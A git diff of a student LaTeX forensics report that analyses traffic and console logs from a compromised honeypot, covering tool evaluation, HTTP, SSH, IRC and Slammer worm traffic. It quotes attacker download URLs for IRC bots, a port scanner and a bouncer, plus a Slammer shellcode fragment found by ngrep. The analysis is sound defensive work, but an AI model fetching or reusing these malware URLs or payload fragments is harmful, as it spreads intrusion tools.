@@ -77,12 +77,15 @@
 
 \usepackage{listings}
 
+\usepackage{movie15}
+
+
 %%% END Article customizations
 
 %%% The "real" document content comes below...
 
 % Title Page
-\newcommand{\mytitle}{Lab07: Honeypot Network Analysis}
+\newcommand{\mytitle}{Lab07.5: Honeypot Network Analysis}
 \subject{Report\\%
     Forensics\\%
     Summersemester 2010\\%
@@ -91,8 +94,8 @@
 \title{\mytitle{}}
 %\subtitle{}
 \author{
-    cand. Dipl. Inf. Tobias Müller <\href{mailto:muellet2@computing.dcu.ie?subject=ss10-forensic-lab01}{muellet2@}>, 59212333 \and
-    BSc. Anthony Walters <\href{mailto:waltera3@computing.dcu.ie?subject=ss10-forensic-lab01}{waltera3@}>, 59213102 \and Conor Lynch <\href{mailto:conor.lynch36@mail.dcu.ie}{lynchc36@}>, 55619599}
+    cand. Dipl. Inf. Tobias Müller <\href{mailto:muellet2@computing.dcu.ie?subject=ss10-forensic-lab08}{muellet2@}>, 59212333 \and
+    BSc. Anthony Walters <\href{mailto:waltera3@computing.dcu.ie?subject=ss10-forensic-lab08}{waltera3@}>, 59213102 \and Conor Lynch <\href{mailto:conor.lynch36@mail.dcu.ie}{lynchc36@}>, 55619599}
 % \institute[Mathe - UniHH]{Fachbereich Mathematik\\
 %         Universit\"at Hamburg}
 % \logo{\includegraphics[height=0.5cm]{cinsects-blue}}
@@ -123,12 +126,13 @@
 \maketitle
 
 
-\section{Introduction}
+\section{Introduction} \label{sec:intro}
 In this Lab report, we will examine recorded traffic and console in- and output of a honeypot that has been ``hacked''.
 The network traffic was recorded into a file in the well known pcap (\emph{p}acket \emph{cap}ture) format\footnote{\url{http://www.tcpdump.org/pcap3_man.html}}.
+Serial I/O was saved in a SQLite3 database along with a timestamp.
 
-Using Wireshark on the pcap file, we can see, by selecting Statistics$\rightarrow$Summary,that the capture file identifies itself as being taken at 2009-01-14 16:24:07 and the capture lasts 11.5 days until 2009-01-26 10:05:01.
-In total, 4323191 IP packets, which sum up to 673023355 bytes,   were sent.
+Using Wireshark on the pcap file, we can see, by selecting Statistics$\rightarrow$Summary, that the capture file identifies itself as being taken at 2009-01-14 16:24:07 and the capture lasts 11.5 days until 2009-01-26 10:05:01.
+In total, 4323191 IP packets, which sum up to 673023355 bytes (more than 0.6GB),   were sent.
 
 
 \begin{figure}
@@ -161,28 +165,20 @@ frame                                    frames:4323191 bytes:673023355
   \caption{Traffic by Protocol, generated with \texttt{tshark -q -r capture.cap -z io,phs}}
   \label{protocol-hierachy}
 \end{figure}
-A breakdown of the traffic by protocol can be found \autoref{protocol-hierachy} (which is stripped to weed out unnecessary information). \FIXME{capitalisation} %capitalisation
+
+A breakdown of the traffic by protocol can be found in
+\hyperref[protocol-hierachy]{figure \ref*{protocol-hierachy}}
+(which is stripped to weed out unnecessary information).
 Interesting facts that can be read are:
 \begin{itemize}
-    \item Most of the data (51MB) was trasferred using Internet Relay Chat (IRC), followed by 18MB via Domain Name Service (DNS), followed by 12MB Secure Shell (SSH).
-    \item That matches the total number of packets: $\sim{}500k$ for IRC and $\sim{}180$ DNS. SSH was used very efficiently: only $\sim{}50k$ packets were sent.
+    \item Most of the data (51MB) was trasferred using Internet Relay Chat (\emph{IRC}), followed by 18MB via Domain Name Service (\emph{DNS}), followed by 12MB Secure Shell (\emph{SSH}).
+    \item That matches the total number of packets: $\sim$500k for IRC and $\sim$180 DNS. SSH was used very efficiently: only $\sim$50k packets were sent.
 \end{itemize}
 Further analysis will thus focus on the reason for these  packets, i.e.\, whether they were used for an attack or to do actual communication.
 
-\begin{table}
-    \begin{center}
-        \begin{tabular}{ll}
-            CPU & Intel Core 2 Duo, 2x 2.6GHz\\
-            RAM & 8GB\\
-            Swap & 150GB\\
-        \end{tabular}
-    \end{center}
-    \caption{Data of the machine that tried to run picviz}
-    \label{table:machinedata}
-\end{table}
 
-
-To get an idea of the distribution of traffic over time, i.e. if an IRC server was attacked constantly or one time with a huge number of packets, a timeline of the traffic can be seen in \autoref{pic:traffic-packets-over-time}.
+To get an idea of the distribution of traffic over time, i.e. if an IRC server was attacked constantly or one time with a huge number of packets, a timeline of the traffic can be seen in
+\hyperref[pic:traffic-packets-over-time]{figure \ref*{pic:traffic-packets-over-time}}.
 
 We can see one big peak near the beginning of the capture indicating many packets being sent.
 The following peaks are not nearly as big as the first one but still indicate a lot of packets.
@@ -190,24 +186,23 @@ The following peaks are not nearly as big as the first one but still indicate a 
 \begin{figure}
   \begin{center}\includegraphics[width=0.8\textwidth]{bin/serial-io-over-time.png}\end{center}
   \caption{Serial in/output over time, we see when the attacker connected} %FIXME: Better interpretation
-  \label{pic:traffic-over-time}
+  \label{pic:serial-io-over-time}
 \end{figure}
 The captured in- and output of the serial console can be graphed over time as well.
-We see in \autoref{pic:serial-io-over-time} that the attackers caused serial I/O regularly with a few noteworthy exceptions.
-Two peeks, which happen to match the traffic I/O shown in \autoref{FIXME traffic over time} %FIXME Traffic over time
+We see in
+\hyperref[pic:serial-io-over-time]{figure \ref*{pic:serial-io-over-time}}
+that the attackers caused serial I/O regularly with a few noteworthy exceptions.
+Two peaks, which happen to match the traffic I/O shown in
+ \hyperref[pic:traffic-packets-over-time]{figure \ref*{pic:traffic-packets-over-time}}
 indicate heavy usage, i.e.\, an attack.
 It does not come as a big surprise that the figure for the serial I/O matches the  figure for the traffic I/O, because at least the serial in- or ouput needs to be transferred to the attacker which is connected to the honeypot via SSH.
 
 
 
-In the rest of this report, we will show how to obtain the commands the attacker issued and present an excerpt.
-In the final report, we will analyse these commands and relate them with the traffic that was produced.
-But as this is only the preliminary version, we will not do any analysis.
 
-
-\section{Visualising Network Traffic}
+% \section{Visualising Network Traffic}
 To aid analysis of the given 700MB network dump, we tried to use visualisation techniques.
-Unfortunately, good visualisation tools, which are easy to use, scale well with our big amount of data and are free, do not exist.
+Unfortunately, good visualisation tools which are easy to use, scale well with our big amount of data and are free, do not exist.
 Or if they do, they are very well hidden.
 But if tools existed, they can be expected to become known and famous within a short time because they would be announced and praised on visualisation hotspots on the Internet\footnote{\url{http://vizsec.org/} or \url{http://secviz.org/}}.
 
@@ -218,7 +213,8 @@ But if tools existed, they can be expected to become known and famous within a s
     \caption{Destination Ports over time}
     \label{pic:dest-ports-over-time} %FIXME: Make the background transparent.
 \end{figure}
-\autoref{pic:dest-ports-over-time} shows the TCP destination ports over time.
+\hyperref[pic:dest-ports-over-time]{Figure \ref*{pic:dest-ports-over-time}}
+shows the TCP destination ports over time.
 We can see constant traffic on port 22, a few port scans over every port and a lot of IRC traffic to port 6667 in the middle of the observed traffic.
 This is particularly interesting, because as IRC traffic, as in \autoref{sec:intro}, is one of the most present protocols in the capture.
 
@@ -226,10 +222,17 @@ This is particularly interesting, because as IRC traffic, as in \autoref{sec:int
 
 
 
+In the rest of this report, we will first evaluate a set of tools that we used or tried to use in \autoref{sec:evaluating-tools}.
+In \autoref{sec:http-traffic} we will identify and discuss packets that were related to HTTP traffic, including a set of tools that were later used to launch attacks on other networks.
+\autoref{sec:ssh-traffic} then will investigate on the third most spoken protocol in the packet capture: SSH.
+This will lead to \autoref{sec:slammer} which discusses an attack launched on other network using a vulnerability in MSSQL which was patched mid 2002 with MS02-039.
+In \autoref{sec:davix} we will discuss our methods of analysing the network traffic and find new insights.
+These will then be used in \autoref{sec:irc-traffic} to find information about the most dominantly used service in capture: IRC.
+Finally, we will conclude our findings in \autoref{sec:conclusion}.
 
 
 
-\subsection{Evaluating Tools}
+\section{Evaluating Tools} \label{sec:evaluating-tools}
 A consiberable amount of time was spent on researching and evaluating tools that are capable of visualising a massive amount of data and networking data in particular.
 
 We tried the following tools:
@@ -240,10 +243,15 @@ We tried the following tools:
         Although there is the Comprehensive PERL Archive Network (CPAN) which is supposed to ease installation of dependencies, it is not really easy to use, because it firstly requires elevated privileges and secondly does not know about the needed modules.
         Although these problems are not unsolvable, we decided to not further try to get SMART up and running.
 
-    \item[\href{http://www.grotto-group.com/~gulfie/projects/analysis/tcpdump2dot/gallery/}{tcpdump2dot}] not tried
+    \item[\href{http://www.grotto-group.com/~gulfie/projects/analysis/tcpdump2dot/gallery/}{tcpdump2dot}]
+        looks solid but not as beautiful as the using tcpdump, afterglow and GraphViz so we did not consider it as an alternative.
+        It's feature is, though, that it does the analysis and rendering automatically.
+        There is no wrapper around afterglow and friends, that just renders a picture in an automated manner.
+
+
     \item[\href{http://www.parseerror.com/pizza/lanmap/}{lanmap}]
         Unfortunately, this project does not exist anymore.
-        But is successor is called \emph{lanmap2} and will be described below.
+        But its successor is called \emph{lanmap2} and will be described below.
 
     \item[\href{http://github.com/pizza/lanmap2}{lanmap2}]
         While this tools looks interesting, it expects the data to be present in a SQL database.
@@ -251,22 +259,27 @@ We tried the following tools:
         Again, we could have parsed the PCap file and entered every packet into the SQL database, but due to timecontraints we did not.
 
     \item[\href{http://www.doxpara.com}{Xovi}]
-        Dan Kaminsky, who is a well known and respected member of the computer security community, has released a network visualisation tool during the annual 22nd Chaos Communication Conference (26C3) held by the German Chaos Computer Club (CCC)\footnote{cmp. \url{http://events.ccc.de/congress/2005/fahrplan/events/1108.de.html}}.
+        Dan Kaminsky, who is a well known and respected member of the computer security community, has released a network visualisation tool during the 22nd annual Chaos Communication Conference (22C3) held by the German Chaos Computer Club (CCC)\footnote{cmp. \url{http://events.ccc.de/congress/2005/fahrplan/events/1108.de.html}}.
         Dan is also very well known for his attacks on DNS in summer 2008.
-        Interestingly enough, his own DNS zone is configured to an link local IP address\footnote{\url{http://tools.ietf.org/html/rfc5735}}, namely 169.254.0.0.
+        Interestingly enough, his own DNS zone is configured to return a link local IP address\footnote{\url{http://tools.ietf.org/html/rfc5735}}, namely 169.254.0.0.
         This is very worrying given that Dan Kaminsky was hacked (pwned) himself\footnote{cmp. the eZine which is well worth a read: \url{http://seclists.org/fulldisclosure/2009/Jul/att-495/zf05.txt}} in summer 2009.
-        But a personal communication reveals that the DNS setup is indeed a deliberatly chosen configuration and the intention is to bring DNS back up soon.
+        But a personal communication reveals that the DNS setup is indeed a deliberatly chosen configuration and the intention is to bring correct DNS information back up soon.
         Anyway, the tool is not available at the moment.
 
     \item[\href{http://www.rumint.org/}{RUMINT}]
-        is very interesting, because it is written in Visual Basic. \FIXME{but CSI miami uses visual basic!!}
-        We immediately stopped considering it to be a useful tool.
+        is very interesting, because it is written in Visual Basic.
+        \begin{figure}
+            \begin{center}\includemovie[autoplay,label=csimovie,controls=true]{0.7\textwidth}{15em}{bin/CSI-Miami-VB-GUI.mp4}\end{center}
+            \caption{Snippet of a CSI Miami episode using VisualBasic to trace an IP address}
+        \end{figure}
+        Although (or better: because) CSI Miami uses VisualBasic, as shown in \movieref{csimovie}{figure 4}, we immediately stopped considering it to be a useful tool.
+
 
     \item[\href{http://www.gephi.org}{Gephi}]
-        "is an open source software for graph and network analysis. It uses a 3D render engine to display large networks in real-time and to speed up the exploration. A flexible and multi-task architecture brings new possibilities to work with complex data sets and produce valuable visual results."
+        ``is an open source software for graph and network analysis. It uses a 3D render engine to display large networks in real-time and to speed up the exploration. A flexible and multi-task architecture brings new possibilities to work with complex data sets and produce valuable visual results.''
 
         At least these are the claims made by the paper introducing Gephi\footnote{\url{http://www.aaai.org/ocs/index.php/ICWSM/09/paper/view/154}}.
-        It is a Free Software tool by an academic, written in Java and looks very promising.
+        It is a Free Software tool made by an academic, written in Java and looks very promising.
         Sadly, we could not use it because it does not import data from anything else except a MySQL database.
         It also consumes a considerable amount of resources of our working machines.
         But more confunsingly: We were not able to create graphs!
@@ -274,7 +287,23 @@ We tried the following tools:
         But even if it did, we would not have clicked the graph together manually anyway.
         So although Gephi looks very promising, we had to search for different tools.
 
-    \item[\href{http://www.wallinfire.net/picviz/screenshots/index.html}{picviz}] looks promising
+    \item[\href{http://www.wallinfire.net/picviz/screenshots/index.html}{picviz}]
+        looked promising, especially since it is a project with strong focus on networks and auditing.
+        We tried to use it to visualise multidimensional data such as packets (time, source IP, destination IP, ...) but we had limited success.
+        While the produced images are generally visually appealing and transferred the information in a smart way, we were not able to render a picture with a resolution good enough for a report.
+    \begin{table}
+        \begin{center}
+            \begin{tabular}{r@{: }l}
+            \hline
+            CPU & Intel Core 2 Duo, 2x 2.6GHz\\
+            RAM & 8GB\\
+            Swap & 150GB\\\hline
+        \end{tabular}
+        \end{center}
+        \caption{Data of the machine that tried to run picviz}
+        \label{table:machinedata}
+    \end{table}
+        Higher quality images were tried to be rendered on the machine with the specs given in  \autoref{table:machinedata}, but even of that rather beefy computer, PicViz did not create an image but rather ran out of memory.
 \end{description}
 
 
@@ -2183,19 +2212,18 @@ We tried the following tools:
 
 
 
-To find out what caused the peaks seen in \autoref{pic:traffic-packets-over-time} an analysis of which commands were run on the honeypot just before the massive traffic increase happened.
-The peaks are easy to spot: By just obtaining the derivative of the function that generates the traffic graph, the points with the highest slope can be determined.
-With this information the time of the beginning of the peak can be determined which then can be correlated with the commands that were entered.
-We found the following program calls to be responsible for the peaks:
-\FIXME{foo} a general purpose implementation of literaly nothing
-\FIXME{bar} which is mostly used to alter the state of the victim by sending it many carefully crafted packets
+Following the peaks seen in
+\hyperref[pic:traffic-packets-over-time]{figure \ref*{pic:traffic-packets-over-time}}
+an analysis of various protocols will be done.
+By doing that, we identify malicious software being run (i.e.\, IRC bots, Bouncers, port scanners) and attacks being launched (i.e.\, MSSQL Slammer, SSH bruteforcer, \ldots{}).
 
 
 
 
 
 
-\subsection{HTTP Traffic}
+
+\section{HTTP Traffic} \label{sec:http-traffic}
 
 \begin{figure}
 \begin{verbatim}
@@ -2224,26 +2252,48 @@ $ tshark -r jubrowska-capture_1.cap -R "http.request" -Tfields \
 \label{fig:http-hosts}
 \end{figure}
 The capture file was analysed for HTTP traffic and the hosts which have been connected to were extracted using \texttt{tshark}.
-The list of hosts can be found in \autoref{fig:http-hosts} and it indicates the sites the attacker has downloaded her used tools from, i.e. \texttt{gelutu.100free.com} or \texttt{freewebtown.com}.
+The list of hosts can be found in
+\hyperref[fig:http-hosts]{figure \ref*{fig:http-hosts}}
+and it indicates the sites the attacker has downloaded her used tools from, i.e. \texttt{gelutu.100free.com} or \texttt{freewebtown.com}.
 Other sites, such as \texttt{kernel.org} or \texttt{download.microsoft.com} were used to download big files to determine the network speed of the machine the attacker broke into.
 By looking at the serial IO log to find the corresponding commands (i.e.\, at \emph{2009-01-15 00:13:09}, we can see that the network speed (or better: slowness) is about 8kB/s.
 
 
 
+Interestingly, this packet capture did not contain much HTTP traffic although the Web becomes the dominant service of \emph{the Internet}.
+This is also indicated by the fact that the people call the Web ``the Internet''.
+So assuming that there was too much traffic showing up in the analysis shown above, we explored another way of identifying the caused web traffic.
+Our approach was to analyse the given serial I/O for popular web tools or URIs, i.e. \texttt{wget} or \texttt{http://}.
+By doing that, we identified a list of tools, shown in
+\hyperref[fig:http-downloads]{figure \ref*{fig:http-downloads}},
+which were downloaded.
+\begin{figure}
+\begin{alltt}
+2009-01-20 23:49:38  http://fotomodelu.clan.su/bot.tar
+2009-01-22 22:26:03  http://www.freewebtown.com/soralph/ralph.tgz
+                 These are EnergyMech IRC bots, usually used to
+                 remotely control the hosting machine
+
+2009-01-22 22:29:52  http://gelutu.100free.com/Leasing.tar
+                 Unsuccessful download attempt
+
+2009-01-27 17:29:42  http://simonika.trei.ro/dup.tgz
+                 A port scanning tool
+
+2009-01-28 08:59:05  http://www.dragutrau.clan.su/PsyBNC/psybnc-linux.tar
+                Relaying IRC server, called Bouncer
+                Interestingly enough, this host does not show
+                up in the host listing given earlier
+\end{alltt}
+\caption{Excerpt of the list of tools downloaded with \texttt{wget}}
+\label{fig:http-downloads}
+\end{figure}
+As later analysis will show, these tools were used to launch further attacks.
 
 
-2009-01-20 19:38:25|--20:38:21--  http://phlo0.ucoz.de/crazyloop.tgz
-2009-01-20 23:49:38|--00:49:35--  http://fotomodelu.clan.su/bot.tar another Mech IRC thing
-2009-01-22 22:26:03|--23:26:22--  http://www.freewebtown.com/soralph/ralph.tgz Mech IRC thing
-2009-01-22 22:29:52|--23:30:15--  http://gelutu.100free.com/Leasing.tar unsuccessful download
-2009-01-27 17:29:42|--18:31:30--  http://simonika.trei.ro/dup.tgz scan
-2009-01-28 08:59:05|--09:59:26--  http://www.dragutrau.clan.su/PsyBNC/psybnc-linux.tar bouncer intersting: this host doesn't show up in above listing
+\section{SSH Traffic} \label{sec:ssh-traffic}
 
-
-
-\subsection{SSH Traffic}
-
-As mentioned in \autoref{sec:intro} \FIXME{Ref the place where the massive number of SSH packets was noted} a lot of SSH packets were recorded.
+As mentioned in \autoref{sec:intro} a lot of SSH packets were recorded.
 The attackers used SSH to log in so an interesting question is the distribution of the attackers.
 We were looking for the IP addresses that the attackers used to successfully log in.
 We obtained these analysing the serial I/O and searching for successful log in messages:
@@ -2259,48 +2309,15 @@ $ sqlite3 serial.db \
 193.227.169.130
 193.231.40.24
 202.44.46.249
-210.181.148.154
-210.243.154.173
-212.110.251.125
-212.110.251.3
-213.180.100.231
-213.184.238.31
-216.127.160.82
-216-199-255-54.ftl.fdn.com
-219.146.252.203
-219.254.35.246
-220.199.184.60
-221.2.73.234
-60.191.63.25
-61.184.104.106
-64.127.124.126
-65.247.242.100
-66.8.57.162
-67.15.78.70
-78.96.46.98
-79.117.135.206
-84.17.129.116
-85.112.77.234
-85.234.144.130
-85.94.246.39
-86.105.240.110
-92.84.247.58
-92.85.101.22
-92.85.105.28
-92.85.89.148
-c-69-138-148-30.hsd1.tn.comcast.net
-drqamta3.epsiloninteractive.com
-from
-host-static-92-115-7-252.moldtelecom.md
-lqs.lns.mit.edu
-nservices.ses-astra.com
-sd-775.dedibox.fr
-zinio.es
+...
+...
+...
 $
 \end{verbatim}
 \begin{figure}
     \begin{center}\includegraphics[width=\textwidth]{bin/ssh-geoip.png}\end{center}
     \caption{Map of origins of successful SSH logins}
+    \label{pic:ssh-geoip}
 \end{figure}
 These addresses can then be used with a GeoIP database to look up the location which the network of the address is assigned to.
 That has been done in \autoref{pic:ssh-geoip} using a GeoIP tool with a local GeoIP database.
@@ -2308,131 +2325,42 @@ The GeoIP data has to be taken with a grain of salt though.
 Firstly, the database might not be correct, simply because network address allocation might have been changed over the recent months\footnote{One could check whether coresponding RIPE entries have been updated though}.
 Secondly, the attacker may very well have used a proxy to tunnel the connection through.
 
-There is nothing we can do about proxyied connections but we can try to revert the GeoIP database to the state of when the honeypot traffic was captured: January 2009.
+There is nothing we can do about proxied connections but we can try to revert the GeoIP database to the state of when the honeypot traffic was captured: January 2009.
 Knowing people in the industry, we were able to get network allocation information for the first quarter of 2009.
 This information was used to ``update'' the local GeoIP database to make it reflect the earlier network topology.
 
+\begin{figure}
+    \begin{center}\includegraphics[width=\textwidth]{bin/ssh-geoip-iran.png}\end{center}
+    \caption{Lonely hacker sitting in a park in Iran}
+    \label{pic:iranian-hacker}
+\end{figure}
 
+
+As already mentioned, SSH is the protocol of choice for logging in to the honeypot so it comes as no surprise that it shows up as the most used protocol in the protocol breakdown.
+However, SSH traffic was caused by the attackers trying to brute force SSH accounts on other machines.
+This can be seen either in a Snort log mentioned below or in the serial I/O database:
 
 \begin{verbatim}
 2009-01-15 00:15:51|ssh-scan
-
-
-
+[...]
 2009-01-27 17:27:09|#######################################
 2009-01-27 17:27:10|###  Just another ssh brute tool  ###
 2009-01-27 17:27:10|###     sunny rain & sunny days     ###
 2009-01-27 17:27:10|###        here comes the sun      ###
-2009-01-27 17:27:10|./a: line 12:  1547 Segmentation fault      ./pscan2 \$1 22
+2009-01-27 17:27:10|./a: line 12:  1547 Segmentation fault  ./pscan2 \$1
 \end{verbatim}
-\FIXME{Write about stupidity} % FIXME: Stupidity
-Aahahahaa, Funny. Stupid kiddies
+So a tool searching for username/password combinations was eventually run.
+However, the tools were obviously either written poorly or the attackers did not know how to handle them.
+In the serial I/O output given above, the most likely self-written tool crashed right away.
+This might indicate the level of experience of the attackers.
 
 
 
 
 
 
-
-\subsection{Slammer Worm}
-
-During a group meeting, we reasoned that a no-op slide would be present in a piece of shell code and so a search through the network pcap file for a sequence of no-ops was performed.
-A tool called ngrep\footnote{\url{http://ngrep.sourceforge.net/}} was used to search for this byte sequence.
-
-\begin{verbatim}
-ngrep -q -t -I jubrowska-capture_1.cap -X '0x9090909090'
-\end{verbatim}
-
-This returned a number of hits of like the following.
-\begin{verbatim}
-U 2009/01/25 15:19:56.970303 194.225.233.248:2347 -> 212.110.251.3:1434
-  ............................................................................
-  ........................B.........p.B.p.B........h...B.....1...P..5....P..Qh
-  .dllhel32hkernQhounthickChGetTf.llQh32.dhws2_f.etQhsockf.toQhsend....B.E.P..
-  P.E.P.E.P..P....B....=U..Qt.....B....1.QQP............Q.E.P.E.P..j.j.j...P.E
-  .P.E.P........<a...E...@...........).......E.j..E.P1.Qf..x.Q.E.P.E.P....
-\end{verbatim}
-A google search with a portion of the printable returned characters indicated that this was probably the SQL Slammer worm. Now knowing our target, we furthur refined our search using the slammer signature \texttt{0401010101010101} obtained online from cisco.\footnote{\url{http://www.cisco.com/global/EMEA/sitewide_assets/pdfs/tdm/threat/sqlsw_wp.pdf}}
-
-\begin{verbatim}
-ngrep -q -t -I jubrowska-capture_1.cap -X '0401010101010101' | less
-\end{verbatim}
-
-We found a total of 104 matches for our match expression in the 700 megabyte file.
-
-
-
-\subsection{DAVIX Scripts}
-At various stages during the analysis, we made use of the scripts included in the DAVIX image. These were useful as a summary of the events in the pcap files, though on their own were of limited use. There were, however, some interesting features that they helped us to reveal.
-
-Many of the scripts proved useless in this particular instance. For example, the script to display HTTP traffic gave no important information as there was barely any HTTP traffic at any stage of the capture.
-
-Conversely, the scripts to map out TCP traffic were far more useful. The script \texttt{006\_activity\_connections\_tcp\_ports.sh} extracts information on TCP between IPs in the capture and renders the result as a map in Afterglow. We used this tool to examine each section of the capture. For the most part the results seemed relatively normal, however we did find an unusual surge of traffic in the ninth section.
-
-\begin{center}\includegraphics[width=\textwidth]{bin/09_tcp_r.png}\end{center}
-
-Using the script \texttt{012\_activity\_tcpdstport\_r.sh} we were able to plot all the destinations of the TCP traffic to a chart in R. At four points in this chart we can see vertical lines, indicating a surge in TCP traffic across many ports. We can see that there is far more activity around the lower ports and it eases off towards the higher ones. The nature of these lines, combined with the observations made earlier, would indicate that a port scan is taking place.
-
-\begin{center}\includegraphics[width=\textwidth]{bin/09_messy.png}\end{center}
-
-There are also two heavy blue lines across many of the plots generated by this script. One is just above 0, so it would make sense to assume that this is port 80 and what we are seeing is standard network traffic. The second is a bit below 10000. Given that we know there was a lot of IRC traffic during the capture, this is likely port 6667 as this is usually used for IRC.
-
-Another tool which was somewhat useful was the script for mapping IP addresses to their appropriate MAC addresses. However, some modification was needed to maximise its usefulness. One problem, for example, was that so many IPs were used during the capture that Afterglow would run out of memory and crash when trying to render some of the more complex parts of the capture file. We managed to fix this by applying a subnet filter to any IP addresses collected, therefore cutting the amount of nodes needed to be rendered to just a fraction of what it was. The filter was implemented by replacing the line:
-
-\verb#cat d_ip_mac.csv | sort | uniq > d_ip_mac_distinct.csv#
-
-with:
-
-\verb#cat d_ip_mac.csv | sed -e s'/212\.110\.251\.3/Gateway/g'| sed -e s'/208\.67\.222\.222/Honeypot/g' |sed -e s'/\.[0-9]*\.[0-9]*\,/\.0\.0\,/g'| sort | uniq > d_ip_mac_distinct.csv#
-
-This also renamed the IPs \texttt{212.110.251.3} to Gateway and \texttt{208.67.222.222} to Honeypot. This served two purposes; Firstly, it meant that the Gateway and Honeypot were easy to find amongst all the numbers in the diagram. Secondly, it prevented these two important IPs from being removed by the filter. We also edited the color.properties file associated with Afterglow to give each important element their own colour.
-
-%FIXME: Put floating figure environment
-\begin{center}\includegraphics[width=\textwidth]{bin/colourmap.png}\end{center}
-
-
-
-
-
-
-\subsection{IRC Traffic}
-The massive number of IRC packets can be explained by looking at the serial I/O database.
-The attacker downloaded and ran \emph{EnergyMech}, an ``Open source IRC bot written in C. Includes many useful features''\footnote{\url{http://www.energymech.net/}}.
-
-Bouncer PsyBNC
-
-We could analyse the IRC Payload and draw these picviz picutres which distinguish the, say, IRC commands.
-
-
-
-\FIXME{Run Snort on pcap file}
-130236 Alerts
-01/15-02:41:15.112461  [**] [1:472:4] ICMP redirect host [**] [Classification: Potentially Bad Traffic] [Priority: 2] {ICMP} 84.3.76.80 -> 212.110.251.3
-
-
-
-
-Some Portscan on 206.0.0.0/8
-2009-01-17 23:31:04|206.0.1.* (total: 0) (0.4% done)
-
-2009-01-23 09:50:50|83.7.1.* (total: 0) (0.4% done)
-
-
-\FIXME{Get pwned usernames: grep for @jubrowska}
-Root is pwned
-interesting to see what someone does when obtained root
-
-
-
-
-
-
-
-
-
-
-We found that the attacker obtained information about the installed CPU.
-While that is a pretty normal thing to do, we found the results interesting:
+Another interesting fact we found was that the attacker obtained information about the installed CPU.
+While that is a pretty normal thing to do, we found the results doubtful:
 \begin{verbatim}
 2009-01-15 00:04:03|model name
 2009-01-15 00:04:04|: Pentium II (Klamath)
@@ -2447,168 +2375,224 @@ A Pentium II Klamath, released more than ten years ago in 1997, never had almost
 So the CPU string must have been overwritten by the Honeypot administrator.
 
 
+To get an idea of how compromised the honeypot was, we identified to number of user accounts that were broken into.
+The list of user account was obtained \texttt{grep}ping through the serial I/O database for strings that match a regular bash pattern, namely ``username@hostname''.
+The compromised users are
+\begin{inparaitem}
+    \item ales
+    \item ftpuser
+    \item gabriela
+    \item test
+    \item virgin
+    \item sales
+    \item service
+    \item test
+    \item virgin
+    \item visa
+    \item vpn
+    \item webmaster
+\end{inparaitem}.
+Also the \emph{root} account was pwned by the attacker.
+She used an account, which she broke into (gabriela), and elevated her privileges using \texttt{sudo} (on 2009-01-15 10:07:52).
+
+It is also noteworthy, that the first malicious activity took place on  Jan 14 17:46:06, just 20 minutes after the honeypot was put online.
+The accout ``sales'' was broken into via SSH from  219.146.252.203, which is most likely located in Qingdao, China.
 
 
 
 
-\section{Keyboard Capture File Examination}
 
-The commands executed on the machine can be found in the given \texttt{serial.db} file.
-This file can be parsed with a program such as SQLite\footnote{\url{http://sqlite.org/}}.
+\section{Slammer Worm} \label{sec:slammer}
 
-First we used the \texttt{.schema} SQL command on the file to get an idea of how the database was structured.
-This told us that the database contains a single table called \texttt{spty}, which contains the fields, \texttt{id, msgtype, ptsname, cnt, msg} and \texttt{ts}.
-Some of these can be easily explained, for example \texttt{id} is the id number of the entry and \texttt{ts} represents the date.
-Some of the other fields would require further exploration.
-
-Using the following SQL command we were able to extract the contents of the database to a text file to more easily understand the purpose of each field.
-
-\begin{verbatim}
-./sqlite3-3.6.23.bin serial.db "SELECT * FROM spty;" > output.txt
-\end{verbatim}
-
-The message field seemed to contain text that would normally be displayed in a terminal.
-msgtype also seemed to be an interesting value.
-It seemed to be an integer value of either 1, 2 or 3, but was appeared to be set to 2 whenever the message field was not blank.
-
-To confirm this theory, we ran the following SQL queries:
-\begin{verbatim}
-SELECT * FROM spty where msgtype = 1 AND msg != '';
-SELECT * FROM spty where msgtype = 2 AND msg != '';
-SELECT * FROM spty where msgtype = 3 AND msg != '';
-\end{verbatim}
-
-As expected, only the second SQL command returned any data.
-We then passed this data out to a text file and set about trying to tidy up its formatting.
-
-We reasoned that lines concerning user input would contain the \texttt{\$} character (as this appears at the end of the command prompt in the shell).
-We eliminated all unrelated lines by carrying out the following sed command on the file:
-\begin{verbatim}
-sed -n '/\$/,/\r/p' output.txt
-\end{verbatim}
-
-This left us with a list of user inputs, however each typed character appeared on a separate line.
-Analysing the file with \texttt{xxd}, we noticed that \texttt{\textbackslash{}n} characters were used to separate typed characters whereas line breaks which we did not want to remove tended to use the \texttt{\textbackslash{}n\textbackslash{}r} character.
-Taking advantage of this, we removed the \texttt{\textbackslash{}n}s with the following command:
-\begin{verbatim}
- awk '{printf("%s",$0)}' output.txt
- \end{verbatim}
-
- The output of this still contained the shell prompt, so we removed it with the following perl script:
-% FIXME: Well, we could use lstlisting for that. But I'm too lazy atm
-% But we shoul consider that for the final report
- \begin{verbatim}
- #!/usr/local/bin/perl
-
-open(INPUTFILE, "<output.txt");
-while(<INPUTFILE>)
-{
-        $line = $_;
-        chomp($line);
-        @words = split('\r',$line);
-        foreach $word(@words)
-        {
-                ($start, $end) = split('\$ ',$word);
-                print"$end\n";
-        }
-}
-\end{verbatim}
-
-This gives us the cleaned up output, some examples of which are shown below.
-These contain some unusual characters such as \texttt{[K}, where the person using the terminal hit a function key such as backspace or one of the arrow keys.
-
-
-
-\section{Sample Output}
-The output of the process above produced a very long list of commands. The first section of this output is printed below:
+During a group meeting, we reasoned that a NOP\footnote{\url{http://en.wikipedia.org/wiki/NOP}} slide would be present in a piece of shell attack code and so a search through the network pcap file for a sequence of NOPs was performed.
+A tool called \texttt{ngrep}\footnote{\url{http://ngrep.sourceforge.net/}} was used to search for this byte sequence.
 
 \begin{verbatim}
-exit
-"  [Kecho nana
-w
-.quit  [K  [K  [K  [K  [K "  [K exit
-exit
-Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
-"  [Kexit
-Linux jubrowska 2.6.28-rc6 #1 Thu Jan 8 15:44:07 CET 2009 i686
-wget http://www.xxx.com/
-more index.html
-exit
-wget 212.169.101.12  [K  [K4:/  [K  [K/                [Ch212.169.101.4/              t212.169.101.4/              t212.169.101.4/              p212.169.101.4/              :212.169.101.4/              /212.169.101.4/              /212.169.101.4/               [C [C [C [C [C [C [C [C [C [C [C [C [C [C  test-data/32MB
-wget http://212.169.101.4/test-data/32MB                           [C  [1P.169.101.4/test-data/32MB                         3.169.101.4/test-data/32MB
+ngrep -q -t -I jubrowska-capture_1.cap -X '0x9090909090'
+\end{verbatim}
 
